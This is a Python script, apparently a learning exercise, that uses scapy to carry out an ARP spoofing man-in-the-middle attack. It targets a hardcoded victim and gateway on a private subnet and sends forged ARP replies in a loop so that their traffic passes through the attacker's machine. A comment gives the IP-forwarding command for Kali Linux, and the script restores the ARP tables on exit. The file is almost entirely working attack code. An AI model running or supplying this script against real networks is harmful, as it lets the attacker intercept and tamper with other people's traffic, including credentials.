#!/usr/bin/env python

import scapy.all as scapy
import time

send_packets_count = 0
target_ip = "10.211.55.6"
gateway_ip = "10.211.55.1"
# echo 1 > /proc/sys/net/ipv4/ip_forward - Allow Kali Linux to flow data through it


# Creating an ARP request to get a MAC address of our target
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # print(answered_list.show())
    try:
        return answered_list[0][1].hwsrc
    except IndexError:
        print("[-] Impossible to connect to this machine")
        quit()


# Sending an ARP response to our target pretending to be someone else (op = 2 means a response)
def spoof(target, spoof_ip):
    target_mac = get_mac(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # Here we mentioned hwsrc to specify the real MAC address of Router (by default it is set as mine)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


"""Here we use method spoof to show a victim that we are a router and show router that we are a victim
to let them communicate through our machine. Covered everything in try-except to avoid 
KeyboardInterrupt error"""
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count += 2
        print("\r[+] Packets sent: " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detecting CTRL + C ..... Resetting ARP tables ..... Please wait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
